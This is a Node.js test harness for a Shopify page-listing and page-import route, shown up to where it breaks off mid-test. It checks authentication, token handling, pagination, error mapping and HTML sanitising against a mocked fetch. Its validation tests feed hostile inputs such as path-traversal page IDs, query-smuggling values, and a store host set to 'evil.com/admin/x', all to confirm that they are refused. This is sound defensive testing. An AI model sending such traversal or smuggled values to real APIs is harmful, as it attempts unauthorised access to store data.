// Verification harness for CLONE FROM SHOPIFY (routes/shopifyPages.js).
//
// Shopify is MOCKED by replacing globalThis.fetch — the route reads it at
// call time, so no network is touched and no real credential is used. Two
// mounts, the same posture as tests/builder/variant-search.mjs:
//   · the REAL router (authenticate + requirePermission intact) to prove an
//     unauthenticated call is refused
//   · the exported listHandler/importHandler behind a stub req.user, to drive
//     body semantics without weakening the real router
//
// The import path is asserted END TO END against the REAL pageClone pipeline
// (scanHtml is imported by the route, not stubbed), so "a fetched page flows
// through the scan pipeline" is proved by the section output, not asserted.
//
// Run:  node server/tests/clone-page/shopify-import.mjs
process.env.DATABASE_URL = 'postgres://puure@127.0.0.1:5433/puure_shoporder';
process.env.NODE_ENV = 'development';
process.env.MONEY_SWEEP_DISABLED = '1';

const NM = '/Users/ludo/Mineblock-LLC/node_modules';
const express = (await import(`${NM}/express/index.js`)).default;

const mod = await import('../../src/routes/shopifyPages.js');
const {
  default: router, listHandler, importHandler,
  numericPageId, visibleText, deriveRowText, mapPageRows, composeLiveUrl, nextPageInfo,
  stripDocumentWrappers, codeForStatus, parseRetryAfter, resetStorefrontCache, ERROR_TABLE,
  LIST_LIMIT_MAX, LIST_LIMIT_DEFAULT, LIST_HOP_MAX, FETCH_TIMEOUT_MS,
  PAGES_RATE_MAX, PAGES_RATE_WINDOW_SEC, THEME_BUILT_MIN_TEXT,
  BODY_PROBE_BYTES, LIST_BODY_BUDGET_BYTES, LIST_NODE_MAX, SUMMARY_MAX,
} = mod;
const { ESCAPE_HATCH_MAX, INPUT_MAX, urlScheme, isAllowedEmbedHost, IFRAME_EMBED_HOSTS } =
  await import('../../src/routes/pageClone.js');

let pass = 0, fail = 0;
const ok = (c, m, x = '') => { if (c) { pass++; console.log(`PASS  ${m}`); } else { fail++; console.log(`FAIL  ${m}  ${x}`); } };
const eq = (got, want, m) => ok(
  JSON.stringify(got) === JSON.stringify(want), m,
  `\n      got  ${JSON.stringify(got)}\n      want ${JSON.stringify(want)}`
);

// Long enough to clear THEME_BUILT_MIN_TEXT.
const COPY = 'Glow like never before. '.repeat(12);

// A realistic Shopify body_html: relative CDN image, relative link, a junk
// script, a Meta pixel, a comment, and an inline <style> that must survive.
const BODY_HTML = `<!-- shopify section -->
<header class="hero">
  <img src="/cdn/shop/files/hero.jpg?v=1" alt="Hero">
  <h1>Glow Serum</h1>
  <a href="/products/glow-serum">Buy now</a>
  <style>.hero{color:#111}</style>
  <script>console.log('theme junk')</script>
</header>
<section id="benefits">
  <p>${COPY}</p>
  <img srcset="/cdn/shop/files/a.jpg 1x, /cdn/shop/files/a@2x.jpg 2x" src="/cdn/shop/files/a.jpg" alt="A">
</section>
<noscript><img height="1" width="1" src="https://www.facebook.com/tr?id=1&ev=PageView&noscript=1"/></noscript>`;

// ===========================================================================
// PURE UNITS
// ===========================================================================
eq(numericPageId('12345'), '12345', 'numericPageId: bare digits pass');
eq(numericPageId('gid://shopify/Page/12345'), '12345', 'numericPageId: gid → digits');
eq(numericPageId('12345?x=1'), '', 'numericPageId: a query tail is refused');
eq(numericPageId('1/../../orders'), '', 'numericPageId: path traversal refused — page_id feeds a REST PATH');
eq(numericPageId('gid://shopify/Product/1'), '', 'numericPageId: a PRODUCT gid is refused (wrong resource)');
eq(numericPageId(null), '', 'numericPageId: null → ""');
eq(numericPageId('  77  '), '77', 'numericPageId: surrounding whitespace tolerated');
eq(numericPageId(''), '', 'numericPageId: empty → ""');

eq(visibleText('<p>a &amp; b</p>'), 'a & b', 'visibleText: tags stripped, entity decoded');
eq(visibleText('<script>var x=1;var y=2;</script><p>hi</p>'), 'hi', 'visibleText: script bodies do NOT count as content');
eq(visibleText('<style>.a{color:red}</style><p>hi</p>'), 'hi', 'visibleText: style bodies do NOT count as content');
eq(visibleText('<!-- a very long comment -->x'), 'x', 'visibleText: comments do not count as content');
eq(visibleText(null), '', 'visibleText: null → "", no throw');
eq(visibleText(42), '42', 'visibleText: a number does not throw');
eq(deriveRowText('<p>' + 'z'.repeat(500) + '</p>').text.length, 500, 'deriveRowText: extracts the probe text once');

eq(composeLiveUrl('https://shop.com/', 'glow'), 'https://shop.com/pages/glow', 'composeLiveUrl: trailing slash normalised');
eq(composeLiveUrl('https://shop.com', ''), 'https://shop.com', 'composeLiveUrl: no handle → the base');
eq(composeLiveUrl('', 'glow'), '', 'composeLiveUrl: no base → ""');
eq(composeLiveUrl('https://shop.com', 'a b'), 'https://shop.com/pages/a%20b', 'composeLiveUrl: handle is encoded, cannot inject a path');

eq(nextPageInfo('<https://x/admin/api/2024-01/pages.json?limit=2&page_info=AbC_1->; rel="next"'), 'AbC_1-', 'nextPageInfo: cursor extracted from rel=next');
eq(nextPageInfo('<https://x?page_info=PREV>; rel="previous"'), '', 'nextPageInfo: a previous-only header yields no cursor');
eq(nextPageInfo('<https://x?page_info=P>; rel="previous", <https://x?page_info=N>; rel="next"'), 'N', 'nextPageInfo: picks next out of a two-entry header');
eq(nextPageInfo(null), '', 'nextPageInfo: null header → ""');
eq(nextPageInfo('garbage'), '', 'nextPageInfo: unparseable header → ""');

{
  const rows = mapPageRows([
    { id: 7, title: 'Glow', handle: 'glow', updated_at: '2026-01-02T03:04:05Z', published_at: '2026-01-01T00:00:00Z', body_html: `<p>${COPY}</p>` },
    { id: 8, title: null, handle: null, published_at: null, body_html: '<div></div>' },
    null, 'nope', {}, { id: 'abc', body_html: '<p>x</p>' },
  ], 'https://shop.com');
  eq(rows.length, 2, 'mapPageRows: malformed rows dropped, good rows survive');
  eq(rows[0].id, '7', 'mapPageRows: numeric id');
  eq(rows[0].live_url, 'https://shop.com/pages/glow', 'mapPageRows: live_url composed');
  eq(rows[0].is_theme_built, false, 'mapPageRows: a page with real copy is NOT theme-built');
  eq(rows[0].published, true, 'mapPageRows: published_at → published true');
  eq(rows[1].is_theme_built, true, 'mapPageRows: an empty body IS flagged theme-built');
  eq([rows[1].title, rows[1].handle], ['', ''], 'mapPageRows: null fields → "", never null');
  eq(rows[1].published, false, 'mapPageRows: missing published_at → false');
  ok(!('body_html' in rows[0]), 'mapPageRows: body_html NEVER reaches the wire — only its summary');
  ok(rows[0].summary.startsWith('Glow like never before'), 'mapPageRows: summary is derived text', rows[0].summary);
}
eq(mapPageRows(null, 'https://s'), [], 'mapPageRows: null rows → []');
eq(mapPageRows('nope', 'https://s'), [], 'mapPageRows: a string → []');

// ===========================================================================
// HTTP
// ===========================================================================
const realFetch = globalThis.fetch;
let fetchImpl = null;
globalThis.fetch = (...args) => fetchImpl(...args);

const mkHeaders = (obj = {}) => ({
  get: (k) => {
    const hit = Object.keys(obj).find((n) => n.toLowerCase() === String(k).toLowerCase());
    return hit === undefined ? null : obj[hit];
  },
});
const jsonResponse = (payload, status = 200, headers = {}) => ({
  ok: status >= 200 && status < 300,
  status,
  headers: mkHeaders(headers),
  json: async () => payload,
});

const SHOP_JSON = { shop: { domain: 'shop.example.com', myshopify_domain: 'test.myshopify.com' } };

// Route every mocked call by path so a test only has to describe what it cares
// about. Returns the URL string it saw for credential-hygiene assertions.
let seenUrls = [];
let seenHeaders = [];
const routeFetch = ({ shop, pages, page }) => async (url, opts) => {
  const u = String(url);
  seenUrls.push(u);
  seenHeaders.push(opts.headers);
  if (u.includes('/shop.json')) return (shop || (() => jsonResponse(SHOP_JSON)))(u, opts);
  if (u.includes('/pages/')) return (page || (() => jsonResponse({ page: null }, 404)))(u, opts);
  if (u.includes('/pages.json')) return (pages || (() => jsonResponse({ pages: [] })))(u, opts);
  throw new Error(`unexpected mock URL ${u}`);
};

const app = express();
app.use(express.json({ limit: '50mb' }));
// Real router — auth intact.
app.use('/api/v1/shopify-pages', router);
// Stub-authed mount for body semantics. The limiter keys on req.user.id, and
// the budget is 30/60s — well under the number of calls this file makes — so
// every block runs as its OWN user (bumpUser()) and only the rate-limit block
// deliberately exhausts a bucket. Without this, later blocks silently drown in
// 429s and their assertions test nothing.
app.use('/stub', (req, _res, next) => { req.user = { id: req.get('x-test-user') || 'u1', role: 'admin' }; next(); });
app.get('/stub/list', listHandler);
app.post('/stub/import', importHandler);

const server = app.listen(0, '127.0.0.1');
await new Promise((r) => server.once('listening', r));
const base = `http://127.0.0.1:${server.address().port}`;
let userSeq = 0;
let USER = 'u0';
// Each block also starts with a COLD storefront cache: the memo (M1) is
// per-process, so a block that asserts on /shop.json traffic must not inherit
// another block's warm entry.
const bumpUser = () => { userSeq += 1; USER = `u${userSeq}`; resetStorefrontCache(); return USER; };
const call = async (path, body) => {
  const headers = { 'x-test-user': USER };
  const init = body === undefined
    ? { headers }
    : { method: 'POST', headers: { ...headers, 'content-type': 'application/json' }, body: JSON.stringify(body) };
  const r = await realFetch(`${base}${path}`, init);
  let json = null;
  try { json = await r.json(); } catch { json = null; }
  return { status: r.status, body: json };
};

process.env.PUURE_SHOPIFY_STORE = 'test.myshopify.com';
process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';

// ---- AUTH -----------------------------------------------------------------
{
  fetchImpl = async () => { throw new Error('Shopify must NOT be called on an unauthenticated request'); };
  const l = await call('/api/v1/shopify-pages/list');
  eq(l.status, 401, 'auth: an unauthenticated list is refused 401');
  const i = await call('/api/v1/shopify-pages/import', { page_id: '1' });
  eq(i.status, 401, 'auth: an unauthenticated import is refused 401');
  ok(!JSON.stringify(l.body || {}).toLowerCase().includes('shopify'), 'auth: the refusal leaks nothing about Shopify', JSON.stringify(l.body));
}

// ---- LIST HAPPY PATH ------------------------------------------------------
{
  bumpUser();
  seenUrls = []; seenHeaders = [];
  fetchImpl = routeFetch({
    pages: () => jsonResponse({ pages: [
      { id: 7, title: 'Glow', handle: 'glow', updated_at: '2026-01-02T03:04:05Z', published_at: '2026-01-01T00:00:00Z', body_html: `<p>${COPY}</p>` },
      { id: 8, title: 'Theme page', handle: 'theme', published_at: null, body_html: '' },
    ] }),
  });
  const r = await call('/stub/list');
  eq(r.status, 200, 'list: 200');
  eq(r.body?.success, true, 'list: success true');
  eq(r.body?.data?.pages?.length, 2, 'list: both pages returned');
  eq(r.body.data.store_domain, 'shop.example.com', 'list: store_domain comes from the shop primary domain');
  eq(r.body.data.pages[0].live_url, 'https://shop.example.com/pages/glow', 'list: live_url built on the primary domain');
  eq(r.body.data.pages.map((p) => p.is_theme_built), [false, true], 'list: theme-built pages are flagged BEFORE the operator clicks');
  eq(r.body.data.truncated, false, 'list: a complete list is not marked truncated');

  // CREDENTIAL HYGIENE
  ok(seenUrls.every((u) => !u.includes('shpat_')), 'creds: the token is NOT in any request URL', JSON.stringify(seenUrls));
  eq(seenHeaders[0]['X-Shopify-Access-Token'], 'shpat_SECRETVALUE', 'creds: the token travels in the header');
  ok(!JSON.stringify(r.body).includes('shpat_'), 'creds: the token never appears in the response body');
  ok(seenUrls.some((u) => /\/pages\.json\?limit=\d+&fields=/.test(u)), 'list: first hop asks for the light field set', JSON.stringify(seenUrls));
  ok(!JSON.stringify(r.body).includes('body_html'), 'list: raw body_html is never forwarded to the browser');
}

// ---- LIST LIMIT CAP -------------------------------------------------------
{
  bumpUser();
  const limitOf = () => Number(/limit=(\d+)/.exec(seenUrls.find((u) => u.includes('pages.json')))?.[1]);
  const run = async (qs) => { seenUrls = []; await call(`/stub/list${qs}`); return limitOf(); };
  eq(await run('?limit=9999'), LIST_LIMIT_MAX, `limit: 9999 is capped to ${LIST_LIMIT_MAX}`);
  eq(await run('?limit=5'), 5, 'limit: an in-range limit is honoured');
  eq(await run('?limit=abc'), LIST_LIMIT_DEFAULT, 'limit: a non-numeric limit falls back to the default');
  eq(await run('?limit=-3'), LIST_LIMIT_DEFAULT, 'limit: a negative limit falls back to the default');
  eq(await run(''), LIST_LIMIT_DEFAULT, 'limit: absent → the default');
}

// ---- LIST PAGINATION + TRUNCATION HONESTY ---------------------------------
{
  bumpUser();
  let hop = 0;
  seenUrls = [];
  fetchImpl = routeFetch({
    pages: () => {
      hop += 1;
      return jsonResponse(
        { pages: [{ id: String(hop), title: `P${hop}`, handle: `p${hop}`, body_html: `<p>${COPY}</p>` }] },
        200,
        // Always advertise another page — the hop cap must be what stops us.
        { Link: `<https://x/admin/api/2024-01/pages.json?page_info=CUR${hop}>; rel="next"` }
      );
    },
  });
  const r = await call('/stub/list');
  eq(r.status, 200, 'paging: 200 across hops');
  eq(hop, LIST_HOP_MAX, `paging: stops at the ${LIST_HOP_MAX}-hop cap`);
  eq(r.body.data.pages.length, LIST_HOP_MAX, 'paging: every hop contributed its rows');
  eq(r.body.data.truncated, true, 'paging: a clipped list SAYS it is clipped — it is not a census of the store');
  ok(seenUrls.filter((u) => u.includes('page_info=')).length === LIST_HOP_MAX - 1, 'paging: the cursor is carried forward', JSON.stringify(seenUrls));
  ok(seenUrls.every((u) => u.startsWith('https://test.myshopify.com/admin/')), 'paging: the next URL is rebuilt against OUR host, never followed verbatim', JSON.stringify(seenUrls));
}
{
  bumpUser();
  // A Link header with no rel=next ends the walk cleanly, not truncated.
  fetchImpl = routeFetch({
    pages: () => jsonResponse({ pages: [{ id: 1, title: 'Only', handle: 'only', body_html: `<p>${COPY}</p>` }] }, 200, { Link: '<https://x?page_info=P>; rel="previous"' }),
  });
  const r = await call('/stub/list');
  eq(r.body.data.truncated, false, 'paging: no rel=next → complete, not truncated');
  eq(r.body.data.pages.length, 1, 'paging: single hop returns its rows');
}

// ---- EMPTY STORE vs OUTAGE ------------------------------------------------
{
  bumpUser();
  fetchImpl = routeFetch({ pages: () => jsonResponse({ pages: [] }) });
  const r = await call('/stub/list');
  eq(r.status, 200, 'empty: a genuinely empty store is 200');
  eq(r.body.data.pages, [], 'empty: with an empty array — a POSITIVE claim about the store');
}

// ---- LIST FAILURE PATHS — never 200, never an empty list ------------------
{
  bumpUser();
  const cases = [
    ['timeout (AbortError)', async () => { const e = new Error('aborted'); e.name = 'AbortError'; throw e; }, 'shopify_unavailable', true],
    ['network failure', async () => { throw new Error('ECONNREFUSED'); }, 'shopify_unavailable', true],
    ['HTTP 500', () => jsonResponse({}, 500), 'shopify_unavailable', true],
    ['HTTP 502', () => jsonResponse({}, 502), 'shopify_unavailable', true],
    ['HTTP 429 throttle', () => jsonResponse({}, 429), 'shopify_unavailable', true],
    ['unparseable body', () => ({ ok: true, status: 200, headers: mkHeaders(), json: async () => { throw new Error('bad json'); } }), 'shopify_unavailable', true],
    ['non-object body', () => jsonResponse(null), 'shopify_unavailable', true],
    ['HTTP 401 dead credential', () => jsonResponse({}, 401), 'shopify_auth_error', false],
    ['HTTP 403 dead credential', () => jsonResponse({}, 403), 'shopify_auth_error', false],
  ];
  for (const [label, impl, code, retryable] of cases) {
    // Fail on the PAGES call; shop.json stays healthy so we prove the page
    // fetch itself is the load-bearing one.
    fetchImpl = routeFetch({ pages: impl });
    const r = await call('/stub/list');
    eq(r.status, 503, `list-fail: ${label} → 503, never 200`);
    eq(r.body?.error?.code, code, `list-fail: ${label} → code ${code}`);
    eq(r.body?.error?.retryable, retryable, `list-fail: ${label} → retryable ${retryable}`);
    ok(!Array.isArray(r.body?.data?.pages), `list-fail: ${label} does NOT return an empty pages array (that would read as "no pages")`);
  }
}
{
  bumpUser();
  // m5 — shop.json is DECORATIVE. Every failure class on it degrades to the
  // configured host; the credential verdict comes from the load-bearing call,
  // which runs on the same request anyway. Raising it from the decorative one
  // made the diagnosis depend on whether the memo happened to skip the call.
  const okPages = () => jsonResponse({ pages: [{ id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` }] });
  for (const status of [401, 403, 402, 423, 500, 503]) {
    bumpUser();
    fetchImpl = routeFetch({ shop: () => jsonResponse({}, status), pages: okPages });
    const r = await call('/stub/list');
    eq(r.status, 200, `degrade: shop.json ${status} does not fail the list`);
    eq(r.body.data.store_domain, 'test.myshopify.com', `degrade: shop.json ${status} falls back to the configured store host`);
    eq(r.body.data.pages[0].live_url, 'https://test.myshopify.com/pages/x', `degrade: shop.json ${status} still yields a usable live_url`);
  }
  // …and the SAME dead credential surfaces from the load-bearing call.
  bumpUser();
  fetchImpl = routeFetch({ shop: () => jsonResponse({}, 401), pages: () => jsonResponse({}, 401) });
  const dead = await call('/stub/list');
  eq(dead.status, 503, 'degrade: a genuinely dead token still fails the list');
  eq(dead.body?.error?.code, 'shopify_auth_error', 'degrade: …with the credential verdict, from the load-bearing call');
}

// ---- M1: THE /shop.json LOOKUP IS MEMOISED ---------------------------------
{
  bumpUser();
  let shopCalls = 0;
  fetchImpl = routeFetch({
    shop: () => { shopCalls += 1; return jsonResponse(SHOP_JSON); },
    pages: () => jsonResponse({ pages: [{ id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` }] }),
    page: () => jsonResponse({ page: { id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` } }),
  });
  await call('/stub/list');
  eq(shopCalls, 1, 'memo: the first request resolves the storefront domain');
  await call('/stub/list');
  await call('/stub/import', { page_id: '3' });
  await call('/stub/import', { page_id: '3' });
  eq(shopCalls, 1, 'memo: three further requests reuse it — no per-request N+1 against the shared Admin bucket');

  // A failed lookup is memoised too, briefly — otherwise a broken /shop.json
  // restores the exact fan-out the memo exists to prevent.
  bumpUser();
  shopCalls = 0;
  fetchImpl = routeFetch({
    shop: () => { shopCalls += 1; return jsonResponse({}, 500); },
    pages: () => jsonResponse({ pages: [] }),
  });
  await call('/stub/list');
  await call('/stub/list');
  await call('/stub/list');
  eq(shopCalls, 1, 'memo: a FAILING shop.json is also memoised — a broken decoration cannot re-create the fan-out');

  // Rotating the store invalidates it (the memo is keyed on the credential).
  bumpUser();
  shopCalls = 0;
  fetchImpl = routeFetch({ shop: () => { shopCalls += 1; return jsonResponse(SHOP_JSON); }, pages: () => jsonResponse({ pages: [] }) });
  await call('/stub/list');
  const prevStore = process.env.PUURE_SHOPIFY_STORE;
  process.env.PUURE_SHOPIFY_STORE = 'other.myshopify.com';
  await call('/stub/list');
  process.env.PUURE_SHOPIFY_STORE = prevStore;
  eq(shopCalls, 2, 'memo: a store rotation re-resolves — the memo is keyed on the credential, not global');
}

// ---- MISSING / MALFORMED CONFIG -------------------------------------------
{
  bumpUser();
  const store = process.env.PUURE_SHOPIFY_STORE;
  const token = process.env.PUURE_SHOPIFY_TOKEN;
  fetchImpl = async () => { throw new Error('must not reach Shopify with no credentials'); };
  for (const [label, mutate] of [
    ['no store', () => { delete process.env.PUURE_SHOPIFY_STORE; }],
    ['no token', () => { delete process.env.PUURE_SHOPIFY_TOKEN; }],
    ['store carrying a path', () => { process.env.PUURE_SHOPIFY_STORE = 'evil.com/admin/x'; }],
  ]) {
    process.env.PUURE_SHOPIFY_STORE = store;
    process.env.PUURE_SHOPIFY_TOKEN = token;
    delete process.env.SHOPIFY_STORE_DOMAIN;
    delete process.env.SHOPIFY_ACCESS_TOKEN;
    mutate();
    const r = await call('/stub/list');
    eq(r.status, 503, `config: ${label} → 503`);
    eq(r.body?.error?.code, 'shopify_not_configured', `config: ${label} → its OWN code, distinguishable from an outage`);
    eq(r.body?.error?.retryable, false, `config: ${label} is NOT retryable — it needs a human`);
    const i = await call('/stub/import', { page_id: '7' });
    eq(i.body?.error?.code, 'shopify_not_configured', `config: ${label} → import agrees`);
  }
  process.env.PUURE_SHOPIFY_STORE = store;
  process.env.PUURE_SHOPIFY_TOKEN = token;
}

// ---- IMPORT: A FETCHED PAGE FLOWS THROUGH THE REAL SCAN PIPELINE ----------
{
  bumpUser();
  seenUrls = [];
  fetchImpl = routeFetch({
    page: () => jsonResponse({ page: { id: 7, title: 'Glow Serum', handle: 'glow', body_html: BODY_HTML } }),
  });
  const r = await call('/stub/import', { page_id: '7' });
  eq(r.status, 200, 'import: 200');
  const d = r.body?.data;
  const all = (d?.sections || []).map((s) => s.html).join('\n');

  eq(d?.sections?.length, 2, 'import: split into the two top-level sections', JSON.stringify((d?.sections || []).map((s) => s.text_preview?.slice(0, 24))));
  ok(!/<script/i.test(all), 'import: the theme junk script is gone — the SAME cleaner as the paste tab ran');
  ok(!/facebook/i.test(all), 'import: the Meta pixel noscript is stripped');
  ok(!/<!--/.test(all), 'import: comments are stripped');
  ok(all.includes('<style>.hero{color:#111}</style>'), 'import: inline <style> survives, exactly as on the paste path');
  ok(d.stats.scripts_removed === 1 && d.stats.pixels_stripped === 1, 'import: stats counted the junk script and the pixel', JSON.stringify(d.stats));
  eq(d.stats.title, 'Glow Serum', 'import: body_html has no <title>, so the Shopify page title is carried over');

  // Relative Shopify CDN paths are absolutized against the live URL — the
  // reference tool dropped this and every cloned image 404'd.
  ok(all.includes('src="https://shop.example.com/cdn/shop/files/hero.jpg?v=1"'), 'import: relative CDN img is absolutized against live_url', all.match(/src="[^"]*hero[^"]*"/)?.[0]);
  ok(all.includes('srcset="https://shop.example.com/cdn/shop/files/a.jpg 1x, https://shop.example.com/cdn/shop/files/a@2x.jpg 2x"'), 'import: srcset entries are absolutized too', all.match(/srcset="[^"]*"/)?.[0]);
  ok(all.includes('href="https://shop.example.com/products/glow-serum"'), 'import: relative href is absolutized');

  eq(d.page, { id: '7', title: 'Glow Serum', handle: 'glow', live_url: 'https://shop.example.com/pages/glow' }, 'import: page meta returned for the picker title');
  // The wire shape MUST be the one /page-clone/create consumes.
  ok(d.sections.every((s) => Number.isInteger(s.index) && typeof s.html === 'string' && typeof s.text_preview === 'string' && s.approx_bytes > 0), 'import: section shape is byte-identical to /page-clone/scan');
  ok(seenUrls.some((u) => u.includes('/pages/7.json?fields=')), 'import: the page is fetched by its validated numeric id', JSON.stringify(seenUrls));
}

// ---- IMPORT: page_id VALIDATION ------------------------------------------
{
  bumpUser();
  fetchImpl = async (url) => { throw new Error(`Shopify must NOT be called for an invalid page_id (${url})`); };
  for (const [label, pid] of [
    ['missing', undefined], ['empty', ''], ['non-numeric', 'abc'],
    ['path traversal', '1/../../orders'], ['query smuggling', '7?fields=x'],
    ['a product gid', 'gid://shopify/Product/7'], ['an object', { id: 7 }],
  ]) {
    const r = await call('/stub/import', pid === undefined ? {} : { page_id: pid });
    eq(r.status, 400, `page_id: ${label} → 400`);
    eq(r.body?.error?.code, 'page_id_required', `page_id: ${label} → code page_id_required`);
  }
  // …and the gid form of a PAGE is accepted.
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 9, title: 'G', handle: 'g', body_html: `<p>${COPY}</p>` } }) });
  const good = await call('/stub/import', { page_id: 'gid://shopify/Page/9' });
  eq(good.status, 200, 'page_id: a Page gid is accepted');
  eq(good.body.data.page.id, '9', 'page_id: and normalised to digits');
}

// ---- m2: A SHORT PAGE IS A BADGE, NOT A GATE -----------------------------
{
  bumpUser();
  // The theme-built floor advises on the LIST. It must not refuse an import:
  // a 199-character page is still a page, and refusing it was us guessing at
  // a cause (the theme) we never looked at.
  for (const [label, body] of [
    ['one char under the floor', `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT - 1)}</p>`],
    ['a single short heading', '<h1>Contact us</h1>'],
    ['a bare paragraph', '<p>Coming soon.</p>'],
  ]) {
    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'Short', handle: 'short', body_html: body } }) });
    const r = await call('/stub/import', { page_id: '5' });
    eq(r.status, 200, `short-page: ${label} IMPORTS — the floor is advisory, not a gate`);
    ok((r.body?.data?.sections?.length || 0) >= 1, `short-page: ${label} yields at least one section`);
  }
  // A body with genuinely nothing in it yields no sections, and THAT is the
  // honest refusal — stated as an observation, with the live URL to fall back on.
  for (const [label, body] of [
    ['an empty body_html', ''],
    ['a whitespace-only body', '   \n  '],
    ['a body that is only a stripped <script>', `<script>${'y'.repeat(400)}</script>`],
  ]) {
    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'Empty', handle: 'empty', body_html: body } }) });
    const r = await call('/stub/import', { page_id: '5' });
    eq(r.status, 422, `no-content: ${label} → 422`);
    eq(r.body?.error?.code, 'no_sections', `no-content: ${label} → code no_sections`);
    eq(r.body?.error?.retryable, false, `no-content: ${label} is not retryable`);
    eq(r.body?.error?.live_url, 'https://shop.example.com/pages/empty', `no-content: ${label} hands back the live URL so the operator can paste it`);
    ok(!/theme|page builder|GemPages|PageFly/i.test(r.body?.error?.message || ''),
      `no-content: ${label} states the OBSERVATION, not a cause we never checked`, r.body?.error?.message);
  }
  // The list badge still fires on the same floor — the observation survives.
  const rows = mapPageRows([
    { id: 1, handle: 'a', body_html: `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT - 1)}</p>` },
    { id: 2, handle: 'b', body_html: `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT)}</p>` },
  ], 'https://s.com');
  eq(rows.map((r) => r.is_theme_built), [true, false], 'short-page: the LIST badge still marks it — advice kept, gate dropped');
}

// ---- M2: PERMANENT FAILURES DO NOT MASQUERADE AS RETRYABLE OUTAGES -------
{
  bumpUser();
  eq(codeForStatus(404), 'shopify_rejected', 'status-map: a bare 404 is a refusal, not an outage');
  eq(codeForStatus(404, { notFoundCode: 'page_not_found' }), 'page_not_found', 'status-map: the page fetch names its own 404');
  eq(codeForStatus(402), 'shopify_store_frozen', 'status-map: 402 → frozen store');
  eq(codeForStatus(423), 'shopify_store_locked', 'status-map: 423 → locked store');
  eq(codeForStatus(400), 'shopify_rejected', 'status-map: other 4xx → refusal');
  eq(codeForStatus(429), 'shopify_unavailable', 'status-map: 429 → retryable');
  eq(codeForStatus(500), 'shopify_unavailable', 'status-map: 5xx → retryable');
  eq(codeForStatus(503), 'shopify_unavailable', 'status-map: 503 → retryable');
  // shopify_unavailable is the ONLY retryable entry in the whole table.
  eq(
    Object.entries(ERROR_TABLE).filter(([, v]) => v.retryable).map(([k]) => k),
    ['shopify_unavailable'],
    'status-map: exactly one code in the table is retryable'
  );

  // The import path, over HTTP. A deleted page is the likeliest 404 here —
  // the list the operator clicked is a snapshot — and no retry brings it back.
  bumpUser();
  fetchImpl = routeFetch({ page: () => jsonResponse({ errors: 'Not Found' }, 404) });
  const gone = await call('/stub/import', { page_id: '7' });
  eq(gone.status, 404, 'deleted page: → HTTP 404, not a 503 outage');
  eq(gone.body?.error?.code, 'page_not_found', 'deleted page: → code page_not_found');
  eq(gone.body?.error?.retryable, false, 'deleted page: → NOT retryable, so the UI hides Retry');
  ok(/no longer exists/i.test(gone.body?.error?.message || ''), 'deleted page: the message tells the operator to refresh the list', gone.body?.error?.message);

  for (const [status, code] of [[402, 'shopify_store_frozen'], [423, 'shopify_store_locked'], [400, 'shopify_rejected']]) {
    bumpUser();
    fetchImpl = routeFetch({ page: () => jsonResponse({}, status) });
    const r = await call('/stub/import', { page_id: '7' });
    eq(r.body?.error?.code, code, `permanent: import ${status} → ${code}`);
    eq(r.body?.error?.retryable, false, `permanent: import ${status} is NOT retryable`);
    ok(!/try again/i.test(r.body?.error?.message || ''), `permanent: import ${status} does not invite a retry`, r.body?.error?.message);

    bumpUser();
    fetchImpl = routeFetch({ pages: () => jsonResponse({}, status) });
    const l = await call('/stub/list');
    eq(l.body?.error?.code, code, `permanent: list ${status} → ${code}`);
    eq(l.body?.error?.retryable, false, `permanent: list ${status} is NOT retryable`);
  }
  // A 404 on the LIST is not a deleted page — it keeps the generic refusal.
  bumpUser();
  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 404) });
  const l404 = await call('/stub/list');
  eq(l404.status, 503, 'permanent: a 404 on the LIST stays a 503 refusal, not a page_not_found');
  eq(l404.body?.error?.code, 'shopify_rejected', 'permanent: …with the generic refusal code');
}

// ---- m6: Retry-After IS PROPAGATED ---------------------------------------
{
  bumpUser();
  eq(parseRetryAfter('12'), 12, 'retry-after: numeric seconds');
  eq(parseRetryAfter('0'), 0, 'retry-after: zero is honoured, not dropped');
  eq(parseRetryAfter(null), null, 'retry-after: absent → null');
  eq(parseRetryAfter('garbage'), null, 'retry-after: unparseable → null');
  eq(parseRetryAfter('999999'), 3600, 'retry-after: an absurd wait is clamped to an hour');
  ok(parseRetryAfter(new Date(Date.now() + 30_000).toUTCString()) > 0, 'retry-after: an HTTP-date is converted to seconds');

  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 429, { 'Retry-After': '17' }) });
  const r = await call('/stub/list');
  eq(r.status, 503, 'retry-after: a throttled list is 503');
  eq(r.body?.error?.retryable, true, 'retry-after: …retryable');
  eq(r.body?.error?.retry_after, 17, 'retry-after: …and Shopify’s own wait rides back to the UI');

  bumpUser();
  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 500) });
  const noHdr = await call('/stub/list');
  ok(!('retry_after' in (noHdr.body?.error || {})), 'retry-after: absent upstream → absent in the body, never a fabricated 0');
}

// ---- n1: THE API VERSION IS INTERPOLATED INTO A PATH ----------------------
{
  bumpUser();
  const prev = process.env.SHOPIFY_API_VERSION;
  fetchImpl = async (url) => { throw new Error(`must not call Shopify with a malformed version (${url})`); };
  for (const bad of ['2024-01/../../orders', '2024-1', 'latest', '../admin', '2024-01 ']) {
    process.env.SHOPIFY_API_VERSION = bad;
    const r = await call('/stub/list');
    eq(r.body?.error?.code, 'shopify_not_configured', `api-version: ${JSON.stringify(bad)} is refused as misconfiguration`);
  }
  // An UNSET version is not a malformed one — it falls back to the shipped
  // default. Asserted so the refusal above is never confused for this.
  delete process.env.SHOPIFY_API_VERSION;
  let seenDefault = '';
  fetchImpl = routeFetch({ pages: (u) => { seenDefault = u; return jsonResponse({ pages: [] }); } });
  const unset = await call('/stub/list');
  eq(unset.status, 200, 'api-version: an UNSET version falls back to the default, it is not a misconfiguration');
  ok(/\/admin\/api\/\d{4}-\d{2}\//.test(seenDefault), 'api-version: …and the default is itself well-formed', seenDefault);

  process.env.SHOPIFY_API_VERSION = '2025-07';
  let seen = '';
  fetchImpl = routeFetch({ pages: (u) => { seen = u; return jsonResponse({ pages: [] }); } });
